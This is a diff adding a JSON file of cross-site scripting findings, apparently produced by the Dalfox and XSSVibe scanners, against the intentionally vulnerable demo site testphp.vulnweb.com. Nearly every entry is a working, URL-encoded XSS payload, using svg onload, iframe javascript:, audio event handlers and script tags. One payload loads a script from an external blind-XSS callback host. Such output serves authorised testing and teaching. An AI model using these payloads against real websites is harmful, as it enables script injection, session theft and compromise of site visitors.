@@ -1,0 +1,70 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?p=",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y&pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%22",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%22"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert%28calfcrusher%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E&id=1",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?cat=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert%28calfcrusher%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E&id=1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?p=%3Caudio+controls+ondurationchange%3Dprompt.valueOf%28%29%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?p=%3Caudio+controls+ondurationchange%3Dprompt.valueOf%28%29%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%28calfcrusher%29%3E%3C%2FiFramE%3E",
+        "payload": "[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%28calfcrusher%29%3E%3C%2FiFramE%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%28calfcrusher%29+class%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%28calfcrusher%29+class%3Ddalfox%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%28calfcrusher%29+class%3Ddalfox%3E&pp=12",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%28calfcrusher%29+class%3Ddalfox%3E&pp=12"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%3Caudio+controls+ondurationchange%3Dalert.bind%28%29%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%3Caudio+controls+ondurationchange%3Dalert.bind%28%29%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert.bind%28%29%28calfcrusher%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E",
+        "payload": "[POC][V][GET][inHTML-none(2)-URL] http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert.bind%28%29%28calfcrusher%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%26%23x27%3B%3E%3CsVg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29%3E",
+        "payload": "[POC][R][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%26%23x27%3B%3E%3CsVg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%26%23x27%3B%3E%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%28calfcrusher%29%3C%2Fscript%3E",
+        "payload": "[POC][V][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%26%23x27%3B%3E%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%28calfcrusher%29%3C%2Fscript%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/?pp=12%22%26%2339%3B%3E%3CsVg%2Fonload%3Dalert.bind%28%29%28calfcrusher%29+class%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/?pp=12%22%26%2339%3B%3E%3CsVg%2Fonload%3Dalert.bind%28%29%28calfcrusher%29+class%3Ddalfox%3E"
+    }
+]
